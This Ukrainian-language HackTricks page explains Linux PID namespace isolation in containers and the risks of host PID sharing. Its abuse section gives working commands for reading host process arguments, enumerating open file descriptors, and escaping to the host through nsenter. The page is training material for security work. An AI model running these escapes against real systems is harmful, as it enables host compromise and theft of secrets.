# Простір імен PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

Простір імен PID визначає, як нумеруються процеси та які процеси є видимими. Саме тому container може мати власний PID 1, хоча він не є реальною машиною. Усередині простору імен workload бачить те, що виглядає як локальне дерево процесів. За межами простору імен host усе ще бачить реальні PID host і повну картину процесів.

З погляду security простір імен PID важливий, оскільки видимість процесів має цінність. Якщо workload може бачити процеси host, він може отримати змогу спостерігати назви сервісів, аргументи командного рядка, secrets, передані в аргументах процесів, дані, отримані з environment через `/proc`, а також потенційні цілі для входу в простори імен. Якщо він може не лише бачити ці процеси, а, наприклад, надсилати їм сигнали або використовувати ptrace за відповідних умов, проблема стає значно серйознішою.

## Робота

Новий простір імен PID починає з власної внутрішньої нумерації процесів. Перший процес, створений усередині нього, стає PID 1 з погляду цього простору імен, а це також означає, що він отримує спеціальну init-подібну семантику для осиротілих дочірніх процесів і поведінки сигналів. Це пояснює багато особливостей container, пов’язаних з init-процесами, збиранням zombie-процесів і тим, чому в container іноді використовують невеликі init-обгортки.

Важливий security-висновок полягає в тому, що процес може здаватися ізольованим, оскільки він бачить лише власне дерево PID, але цю ізоляцію можна навмисно прибрати. Docker надає для цього `--pid=host`, а Kubernetes — `hostPID: true`. Після приєднання container до простору імен PID host workload безпосередньо бачить процеси host, і багато подальших attack paths стають набагато реалістичнішими.

## Лабораторна робота

Щоб вручну створити простір імен PID:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Тепер shell бачить приватне представлення процесів. Прапорець `--mount-proc` важливий, оскільки він монтує екземпляр procfs, що відповідає новому PID namespace, завдяки чому список процесів усередині є узгодженим.

Щоб порівняти поведінку контейнера:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Різниця очевидна й проста для розуміння, тому це хороша перша лабораторна робота для читачів.

## Використання під час виконання

Звичайні контейнери в Docker, Podman, containerd і CRI-O отримують власний PID-простір імен. Kubernetes Pods зазвичай також отримують ізольоване представлення PID, якщо workload явно не запитує спільне використання PID хоста. Середовища LXC/Incus використовують той самий примітив ядра, хоча варіанти використання системних контейнерів можуть відкривати складніші дерева процесів і заохочувати використання додаткових скорочень для налагодження.

Скрізь діє одне й те саме правило: якщо runtime вирішив не ізолювати PID-простір імен, це навмисне послаблення межі контейнера.

## Неправильні конфігурації

Канонічна неправильна конфігурація — спільне використання PID-простору хоста. Команди часто виправдовують це зручністю налагодження, моніторингу або керування сервісами, але це завжди слід розглядати як суттєвий виняток із безпеки. Навіть якщо контейнер не має безпосереднього примітиву запису до процесів хоста, сама видимість може багато розкрити про систему. Після додавання таких capabilities, як `CAP_SYS_PTRACE`, або корисного доступу до procfs ризик суттєво зростає.

Ще одна помилка — припущення, що спільне використання PID-простору хоста є нешкідливим лише тому, що workload за замовчуванням не може завершувати або використовувати ptrace щодо процесів хоста. Такий висновок ігнорує цінність перерахування, наявність цілей для входу в namespace і те, як видимість PID поєднується з іншими послабленими засобами контролю.

## Зловживання

Якщо PID-простір імен хоста є спільним, attacker може перевіряти процеси хоста, отримувати аргументи процесів, визначати цікаві сервіси, знаходити відповідні PID для `nsenter` або поєднувати видимість процесів із привілеями, пов’язаними з ptrace, щоб втручатися в роботу хоста чи сусідніх workload. У деяких випадках самого факту видимості потрібного довготривалого процесу достатньо, щоб змінити подальший план атаки.

Перший практичний крок завжди полягає в підтвердженні того, що процеси хоста справді видимі:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Після того як PID хоста стають видимими, аргументи процесів і цілі входу до namespace часто стають найкориснішим джерелом інформації:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Якщо доступний `nsenter` і є достатні привілеї, перевірте, чи можна використати видимий процес хоста як міст між просторами імен:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Навіть коли вхід заблоковано, спільний доступ до PID хоста вже є цінним, оскільки розкриває структуру сервісів, компоненти середовища виконання та потенційні привілейовані процеси, які можна атакувати далі.

Видимість PID хоста також робить зловживання файловими дескрипторами реалістичнішим. Якщо привілейований процес хоста або сусіднє workload має відкритий чутливий файл чи сокет, атакер може отримати доступ до `/proc/<pid>/fd/` і повторно використати цей дескриптор залежно від прав власності, параметрів монтування procfs та моделі цільового сервісу.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Ці команди корисні, оскільки показують, чи зменшує `hidepid=1` або `hidepid=2` видимість процесів між собою, а також чи взагалі видимі явно цікаві дескриптори, як-от відкриті файли із секретами, логи або Unix-сокети.

### Повний приклад: PID host + `nsenter`

Спільний доступ до PID host стає прямою втечею на host, якщо процес також має достатні привілеї для приєднання до namespace host:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Якщо команда виконана успішно, процес контейнера тепер виконується в mount, UTS, network, IPC і PID namespaces хоста. Наслідком є негайна компрометація хоста.

Навіть якщо `nsenter` відсутній, такого самого результату можна досягти через binary хоста, якщо файлова система хоста змонтована:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Нещодавні примітки щодо runtime

Деякі атаки, пов’язані з PID namespace, не є традиційними помилковими конфігураціями `hostPID: true`, а виникають через помилки реалізації runtime у способі застосування захистів procfs під час налаштування контейнера.

#### Race у `maskedPaths`, що веде до procfs хоста

У вразливих версіях `runc` зловмисники, здатні контролювати образ контейнера або workload `runc exec`, могли створити race під час фази маскування, замінивши `/dev/null` усередині контейнера на symlink до чутливого шляху procfs, наприклад `/proc/sys/kernel/core_pattern`. Якщо race вдавалася, bind mount для masked path міг бути змонтований не до того target і відкрити для нового контейнера глобальні для хоста параметри procfs.

Корисна команда для перевірки:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Це важливо, оскільки кінцевий вплив може бути таким самим, як і за прямого доступу до procfs: доступний для запису `core_pattern` або `sysrq-trigger`, після чого можливе виконання коду на host або відмова в обслуговуванні.

#### Ін’єкція в namespace за допомогою `insject`

Інструменти для ін’єкції в namespace, такі як `insject`, показують, що взаємодія з PID namespace не завжди потребує попереднього входу в цільовий namespace до створення процесу. Допоміжний процес може під’єднатися пізніше, використати `setns()` і виконати код, зберігаючи видимість цільового PID-простору:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Цей тип техніки має найбільше значення для розширеного debugging, offensive tooling і post-exploitation workflows, де контекст namespace потрібно приєднати після того, як runtime уже ініціалізував workload.

### Патерни зловживання FD

Коли host PIDs видимі, варто окремо згадати два патерни. По-перше, privileged process може залишити чутливий file descriptor відкритим після `execve()`, якщо його не було позначено як `O_CLOEXEC`. По-друге, services можуть передавати file descriptors через Unix sockets за допомогою `SCM_RIGHTS`. В обох випадках цікавим об’єктом є вже не pathname, а вже відкритий handle, який process із нижчими привілеями може успадкувати або отримати.

Це важливо під час роботи з containers, оскільки handle може вказувати на `docker.sock`, privileged log, host secret file або інший цінний об’єкт, навіть коли сам path недоступний безпосередньо з файлової системи container.

## Перевірки

Мета цих команд — визначити, чи має process приватне представлення PID, або ж він уже може перелічувати значно ширше середовище processes.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Що тут важливо:

- Якщо список процесів містить очевидні служби хоста, спільне використання PID хоста, імовірно, уже ввімкнено.
- Бачити лише невелике дерево процесів контейнера — нормальний базовий стан; бачити `systemd`, `dockerd` або не пов’язані з контейнером демони — ні.
- Щойно PID хоста стають видимими, навіть інформація про процеси, доступна лише для читання, стає корисною розвідувальною інформацією.

Якщо ви виявили контейнер, запущений зі спільним використанням PID хоста, не сприймайте це як косметичну відмінність. Це суттєво змінює те, що робоче навантаження може спостерігати та потенційно на що може впливати.
